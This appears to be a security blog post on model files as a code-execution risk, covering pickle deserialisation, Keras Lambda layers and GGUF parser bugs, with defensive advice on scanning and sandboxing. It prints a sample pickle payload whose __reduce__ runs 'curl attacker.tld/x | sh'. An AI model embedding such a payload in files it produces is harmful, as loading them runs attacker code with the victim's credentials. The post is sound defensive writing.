---
title: "Your model file is a code execution primitive"
description: "Downloading a model from a public hub is running untrusted code. Pickle deserialisation, Keras Lambda layers (CVE-2024-3660) and GGUF parsing all give an attacker execution before inference ever starts — and most ML pipelines scan none of it."
pubDate: 2026-10-08
tags: ["ML Supply Chain", "Model Security", "Pickle RCE", "AI Security", "CVE-2024-3660"]
tldr: "A model file is not data — several formats execute code on load. Pickle-based checkpoints run arbitrary Python during deserialisation, Keras .h5 and .keras files can carry Lambda layers that execute on load (CVE-2024-3660), and binary formats like GGUF have parser-level memory bugs. If your pipeline pulls weights from a public hub and calls load() without scanning first, you have a remote code execution path that no amount of prompt-level defence touches."
faq:
  - q: "Is it safe to download models from Hugging Face?"
    a: "It depends entirely on the file format. SafeTensors was designed specifically to avoid code execution and is safe to load. Pickle-based formats such as .pt, .pth, .bin and .ckpt execute arbitrary Python during deserialisation and should be treated as untrusted executables. Hugging Face runs its own scanning, which helps, but it is not a guarantee and it is not a substitute for scanning in your own pipeline."
  - q: "What is CVE-2024-3660?"
    a: "A vulnerability in Keras where a model saved in .h5 or .keras format can contain a Lambda layer holding arbitrary Python code that executes when the model is loaded. Loading an untrusted Keras model is therefore equivalent to running an untrusted script. Keras 2.13 and later require safe_mode to be disabled explicitly before such layers will run."
  - q: "Does SafeTensors eliminate the risk?"
    a: "It eliminates the deserialisation-execution risk, which is the largest one. It does not address backdoored weights, where the model's behaviour has been tampered with but the file loads harmlessly. Those require behavioural evaluation, not static scanning."
  - q: "How do I scan model files in CI?"
    a: "Run a static scanner over every model artefact before it is loaded, and fail the build on critical findings. Emit results as SARIF so they surface in your existing code-scanning view rather than a separate report nobody reads."
---

Ask a team how they vet a third-party Python package and you will get a reasonable answer — a lockfile, a vulnerability scanner, maybe a policy about which registries are allowed.

Ask the same team how they vet a model checkpoint pulled from a public hub, and the answer is usually that they download it and call `load()`.

Those are the same category of action. Only one is treated that way.

## Loading is executing

The problem starts with pickle. PyTorch checkpoints — `.pt`, `.pth`, `.bin`, `.ckpt` — are pickle archives, and pickle is not a data format. It is a bytecode format for reconstructing Python objects, and reconstruction can call arbitrary callables.

A malicious checkpoint doesn't need an exploit. It needs a `__reduce__` method, which is a documented, intended feature of the protocol:

```python
class Payload:
    def __reduce__(self):
        import os
        return (os.system, ("curl attacker.tld/x | sh",))
```

Pickle that, embed it in a checkpoint, and the command runs the moment someone deserialises the file. No memory corruption, no clever trick — the format is doing exactly what it was designed to do. `torch.load()` added `weights_only=True` to narrow this, and it genuinely helps, but a great deal of production code still predates it or disables it to load older artefacts.

Keras has its own version. A `.h5` or `.keras` file can carry a **Lambda layer** containing serialised Python that executes on load. That is **CVE-2024-3660**. Modern Keras gates it behind `safe_mode`, but the gate is only useful if nobody has turned it off to make an old model work — and somebody always has.

Binary formats are not automatically safer; they just fail differently. **GGUF**, the format that carries most local LLM weights, is parsed by C++ that reads length fields out of the file. Malformed metadata has produced integer overflows and out-of-bounds reads. Here the bug is in the parser rather than the format's design, but the outcome is the same: hostile bytes meet code that trusts them.

## Where it actually bites

The uncomfortable part is *when* this executes. Not at inference — at load. Which means it runs:

- on the training box, with cluster credentials in the environment
- in the CI runner that packages the model, with registry push tokens
- on the inference host, inside the service account your application runs as
- on a researcher's laptop, which has everything

Model loading tends to happen early, in trusted contexts, before any of your runtime guardrails exist. An attacker who lands there is not inside your chatbot. They are inside your build system.

And the delivery path is wide open: typosquatted repo names, a compromised maintainer account, a fine-tune of a popular base model that is genuinely better at something, a checkpoint linked from a paper. Nobody diffs a 4GB binary.

## What to actually do

**Prefer SafeTensors, and enforce it.** It was designed precisely so that loading cannot execute. Where you control the pipeline, make it the only accepted format and reject the rest at ingestion. This single policy removes the entire deserialisation class.

**Scan everything you cannot control.** You will still need to load third-party artefacts. Scan them before loading — not after, not at runtime. Look for pickle opcodes that reach imports or callables, Keras Lambda layers, suspicious GGUF length fields, zip-slip paths in archive-based formats, and embedded credentials, which turn up far more often than people expect.

This is the gap I wrote [MLSec-Analyzer](https://github.com/frustratedresearcher/MLSec-Analyzer) for: static analysis across pickle, Keras, TensorFlow SavedModel, GGUF, ONNX, SafeTensors and NumPy formats, emitting **SARIF** so findings appear in the same code-scanning view as everything else. Findings nobody sees do not change behaviour.

**Load untrusted models in a sandbox.** No outbound network, no credentials in the environment, minimal filesystem. If a checkpoint is going to execute something, let it execute in a container that can't reach anything. This is cheap and it is the control that works when scanning misses.

**Pin and verify.** Pin by content hash, not by tag. Tags move. A model that passed review last month is not necessarily the bytes you are pulling today.

## The part scanning cannot fix

Everything above addresses files that execute code. It does not address **backdoored weights** — a model that loads perfectly, behaves correctly on your evaluation set, and misbehaves on a trigger the attacker chose.

Static analysis cannot find that, because there is nothing structurally wrong with the file. Detecting it needs behavioural work: evaluation on held-out data you control, anomaly detection across weight distributions, and provenance you actually trust. That remains an unsolved problem in the general case, and anyone claiming otherwise is selling something.

Which is the honest summary. The execution-on-load class is solvable today with format policy, scanning and sandboxing, and most teams simply haven't done it. The behavioural class is research. Fix the first one before worrying about the second — it's the one being exploited.
